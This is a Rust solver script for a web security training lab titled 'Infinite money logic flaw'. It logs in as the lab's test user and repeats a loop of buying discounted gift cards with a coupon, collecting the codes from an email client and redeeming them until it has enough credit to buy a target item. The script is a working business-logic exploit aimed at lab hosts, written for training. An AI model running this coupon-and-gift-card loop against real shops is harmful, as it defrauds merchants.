/*****************************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 28/10/2023
*
* Lab: Infinite money logic flaw
*
* Steps: 1. Fetch the login page
*        2. Extract the csrf token and session cookie
*        3. Login as wiener
*        4. Fetch wiener's profile
*        5. Extract the csrf token needed for subsequent requests
*        6. Add 10 gift cards to the cart
*        7. Apply the coupon SIGNUP30
*        8. Place order
*        9. Fetch the email client
*       10. Collect the received gift card codes
*       11. Redeem the codes one by one
*       12. Repeat the stpes from 6 to 11 multiple times (after 43 times you will have
*           the price of the leather jacket and a little more)
*       13. Add the leather jacket the cart
*       14. Plac order
*       15. Confirm order
*
******************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a0600cd04f4e131823353e5007800b0.web-security-academy.net";

    // change this to your exploit domain
    let exploit_domain = "exploit-0ab9001b04abe1af82c652a1019c0065.exploit-server.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    print!("{}", "⦗1⦘ Fetching the login page.. ".white());
    io::stdout().flush();

    // fetch the login page
    let login_page = client
        .get(format!("{url}/login"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch the login page".red()));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗2⦘ Extracting the csrf token and session cookie.. ".white(),
    );
    io::stdout().flush();

    // extract session cookie
    let mut session = extract_session_cookie(login_page.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    // extract the csrf token
    let mut csrf =
        extract_csrf(login_page).expect(&format!("{}", "[!] Failed to extract the csrf".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗3⦘ Logging in as wiener.. ".white(),);
    io::stdout().flush();

    // login as wiener
    let login = client
        .post(format!("{url}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
            ("csrf", &csrf),
        ]))
        .send()
        .expect(&format!("{}", "[!] Failed to login as wiener".red()));

    // extract session cookie of wiener
    session = extract_session_cookie(login.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗4⦘ Fetching wiener's profile.. ".white(),);
    io::stdout().flush();

    // fetch wiener's profile
    let wiener_profile = client
        .get(format!("{url}/my-account"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch wiener's profile".red()));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗5⦘ Extracting the csrf token needed for subsequent requests.. ".white(),
    );
    io::stdout().flush();

    // extract the csrf token needed for subsequent requests
    csrf = extract_csrf(wiener_profile).expect(&format!(
        "{}",
        "[!] Failed to extract the csrf token needed for subsequent requests".red()
    ));

    println!("{}", "OK".green());

    // after 43 times you will have the price of the leather jacket and a little more
    for counter in 1..44 {
        print!(
            "{} ({}/43).. ",
            "⦗6⦘ Adding 10 gift cards to the cart".white(),
            counter
        );
        io::stdout().flush();

        // add 10 gift cards to the cart
        client
            .post(format!("{url}/cart"))
            .header("Cookie", format!("session={session}"))
            .form(&HashMap::from([
                ("productId", "2"),
                ("redir", "PRODUCT"),
                ("quantity", "10"),
            ]))
            .send()
            .expect(&format!(
                "{}",
                "[!] Failed to add 10 gift cards to the cart".red()
            ));

        println!("{}", "OK".green());
        print!(
            "{} {}.. ",
            "⦗7⦘ Applying the coupon".white(),
            "SIGNUP30".yellow()
        );
        io::stdout().flush();

        // apply the coupon
        client
            .post(format!("{url}/cart/coupon"))
            .header("Cookie", format!("session={session}"))
            .form(&HashMap::from([("coupon", "SIGNUP30"), ("csrf", &csrf)]))
            .send()
            .expect(&format!("{}", "[!] Failed to apply the coupon".red()));

        println!("{}", "OK".green());
        print!("{}", "⦗8⦘ Placing order.. ".white(),);
        io::stdout().flush();

        // place order
        client
            .post(format!("{url}/cart/checkout"))
            .header("Cookie", format!("session={session}"))
            .form(&HashMap::from([("csrf", &csrf)]))
            .send()
            .expect(&format!("{}", "[!] Failed to place order".red()));

        println!("{}", "OK".green());
        print!("{}", "⦗9⦘ Fetching the email client.. ".white(),);
        io::stdout().flush();

        // fetch the email client
        let email_client = client
            .get(format!("https://{exploit_domain}/email"))
            .send()
            .expect(&format!("{}", "[!] Failed to fetch the email client".red()));

        println!("{}", "OK".green());
        print!(
            "{}",
            "⦗10⦘ Collecting the received gift card codes.. ".white(),
        );
        io::stdout().flush();

        // get the body of the response
        let body = email_client.text().unwrap();

        // collect codes to a vector
        let codes = collect_codes(&body);

        println!("{}", "OK".green());

        for (index, code) in codes.iter().enumerate() {
            print!(
                "\r{} {} ({}/10).. ",
                "⦗11⦘ Redeeming the code".white(),
                code.yellow(),
                index + 1
            );
            io::stdout().flush();

            // redeem the code
            client
                .post(format!("{url}/gift-card"))
                .header("Cookie", format!("session={session}"))
                .form(&HashMap::from([("gift-card", code), ("csrf", &csrf)]))
                .send()
                .expect(&format!("{}", "[!] Failed to redeem the code".red()));
        }

        println!("{}", "OK".green());
    }

    print!("{}", "⦗12⦘ Adding the leather jacket the cart.. ".white(),);
    io::stdout().flush();

    // add the leather jacket cards to the cart
    client
        .post(format!("{url}/cart"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("productId", "1"),
            ("redir", "PRODUCT"),
            ("quantity", "1"),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to add the leather jacket cards to the cart".red()
        ));

    println!("{}", "OK".green());
    print!("{}", "⦗13⦘ Placing order.. ".white(),);
    io::stdout().flush();

    // place order
    client
        .post(format!("{url}/cart/checkout"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([("csrf", &csrf)]))
        .send()
        .expect(&format!("{}", "[!] Failed to place order".red()));

    println!("{}", "OK".green());
    print!("{}", "⦗14⦘ Confirming order.. ".white(),);
    io::stdout().flush();

    /*
        confirm order to mark the lab as solved.
        without this request the leather jacket will be purchased
        and your credit will be decreased but the lab will sill be unsolved
    */
    client
        .get(format!(
            "{url}/cart/order-confirmation?order-confirmed=true"
        ))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "[!] Failed to place order".red()));

    println!("{}", "OK".green());
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as".white(),
        "solved".green()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(10))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}

/*************************************************
* Function to extract csrf from the response body
**************************************************/
fn extract_csrf(res: Response) -> Option<String> {
    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
    {
        Some(csrf.to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}

/******************************************************
* Function to collect all gift card codes in a vector
*******************************************************/
fn collect_codes(body: &str) -> Vec<String> {
    let mut codes = Vec::new();
    let pattern = Regex::new(r"Your gift card code is:\s*(.*)\s*Thanks,").unwrap();
    let mut captures = pattern.captures_iter(&body);
    for c in captures.take(10) {
        let card = c.get(1).unwrap().as_str().to_string();
        codes.push(card);
    }
    codes
}
